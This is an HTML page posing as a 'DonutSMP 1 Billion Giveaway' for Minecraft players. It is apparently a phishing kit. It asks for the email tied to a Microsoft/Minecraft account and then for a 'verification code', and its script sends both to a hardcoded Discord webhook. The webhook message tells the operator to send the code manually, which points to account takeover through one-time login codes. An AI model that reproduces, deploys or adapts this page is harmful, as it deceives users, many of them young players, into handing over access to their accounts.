<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>DonutSMP 1 Billion Giveaway</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet"/>
  <style>
    :root { --purple: #9d4edd; --light: #f4f4f9; }
    body { margin:0; font-family:'Poppins',sans-serif; background:linear-gradient(135deg,#1a1a2e,#16213e); color:var(--light); min-height:100vh; display:flex; align-items:center; justify-content:center; text-align:center; padding:20px; }
    .container { max-width:800px; background:rgba(255,255,255,0.05); padding:40px 30px; border-radius:20px; backdrop-filter:blur(10px); box-shadow:0 10px 30px rgba(0,0,0,0.5); }
    h1 { font-size:3.5rem; background:linear-gradient(90deg,#ff6b6b,#9d4edd); -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin:0 0 20px; }
    p { font-size:1.2rem; line-height:1.6; margin-bottom:30px; }
    .btn { background:var(--purple); color:white; border:none; padding:15px 40px; font-size:1.3rem; border-radius:50px; cursor:pointer; transition:0.3s; font-weight:600; }
    .btn:hover { transform:scale(1.05); background:#c06aff; }
    .step { display:none; }
    .step.active { display:block; animation:fadeIn 0.6s; }
    @keyframes fadeIn { from{opacity:0; transform:translateY(20px);} to{opacity:1; transform:translateY(0);} }
    input[type="email"], input[type="text"] { width:100%; max-width:400px; padding:15px; margin:15px 0; border-radius:10px; border:none; font-size:1.1rem; }
    .success { font-size:2.5rem; color:#4ade80; }
  </style>
</head>
<body>
  <div class="container">

    <div id="step1" class="step active">
      <h1>1,000,000,000 Giveaway</h1>
      <p>DonutSMP has given us so much.<br>Now we're giving back the biggest way possible.<br><br>
         <strong>ONE BILLION</strong> → ONE lucky player.</p>
      <button class="btn" onclick="showStep('step2')">JOIN THE EVENT</button>
    </div>

    <div id="step2" class="step">
      <h2>Enter your email</h2>
      <p>Must be the email linked to your Minecraft/Microsoft account.<br>We’ll contact you here if you win.</p>
      <input type="email" id="email" placeholder="you@example.com" required />
      <br/>
      <button class="btn" onclick="submitEmail()">Submit Email</button>
    </div>

    <div id="step3" class="step">
      <h2>Check your email</h2>
      <p>We’ve been notified!<br>You’ll receive your personal verification code shortly.</p>
      <input type="text" id="code" placeholder="Enter your code here" />
      <br/>
      <button class="btn" onclick="verifyCode()">Verify & Enter Giveaway</button>
    </div>

    <div id="step4" class="step">
      <h1 class="success">You're In!</h1>
      <p>You are officially entered into the <strong>1 Billion Giveaway</strong>.<br><br>Good luck!</p>
    </div>

  </div>

  <script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1439990429226369166/lJgEK_CeiR5qkbvXsFCLwmHH7jVoS_wx0IT97nPMyvPXnbltCKfV1b27urEmg-DnWJwr";

    function showStep(id) {
      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
      document.getElementById(id).classList.add('active');
    }

    async function submitEmail() {
      const email = document.getElementById('email').value.trim().toLowerCase();
      if (!email || !email.includes('@')) return alert("Please enter a valid email");

      // @everyone ping + entry notification
      await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          content: "@everyone **NEW GIVEAWAY ENTRY!**\nEmail: **" + email + "**\n\nSend them a verification code manually!"
        })
      });

      localStorage.setItem('pendingEmail', email);
      alert("Submitted! Check your email for your code soon.");
      showStep('step3');
    }

    async function verifyCode() {
      const code = document.getElementById('code').value.trim();
      const email = localStorage.getItem('pendingEmail');

      if (!code) return alert("Enter the code you received");

      // Confirmation ping (no @everyone this time so you’re not spammed twice)
      await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          content: "**VERIFIED & ENTERED**\nEmail: **" + email + "**\nCode used: `" + code + "`\nThey are now officially in the 1 Billion giveaway!"
        })
      });

      localStorage.removeItem('pendingEmail');
      showStep('step4');
    }
  </script>
</body>
</html>
